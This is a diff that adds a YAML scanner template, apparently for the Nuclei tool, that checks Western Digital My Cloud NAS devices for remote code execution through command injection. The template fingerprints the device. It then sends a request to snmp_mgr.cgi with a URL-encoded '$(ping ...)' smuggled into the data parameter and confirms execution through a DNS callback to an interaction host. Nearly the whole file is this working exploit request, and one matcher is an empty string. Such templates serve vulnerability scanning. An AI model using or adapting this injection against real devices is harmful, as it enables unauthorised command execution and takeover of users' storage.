@@ -1,0 +1,42 @@
+id: poc-western-digital-nas-cgi-snmpv3-rce
+info:
+  name: Western Digital NAS CGI SNMPv3 Remote Code Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce, dnslog
+
+variables:
+  domain: "{{interactsh-url}}"
+
+http:
+  - id: initial-check
+    method: GET
+    path:
+      - "{{BaseURL}}/"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "WDMyCloud"
+
+  - id: exploit-request
+    method: GET
+    path:
+      - "{{BaseURL}}/cgi-bin/snmp_mgr.cgi?cmd=cgi_SNMPv3_modify_one_record&data=%3Ca%20id=0%3E%3Ccell%3E%24(ping%20{{domain}})%3C/cell%3E%3C/a%3E&data_len=103"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - ""
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
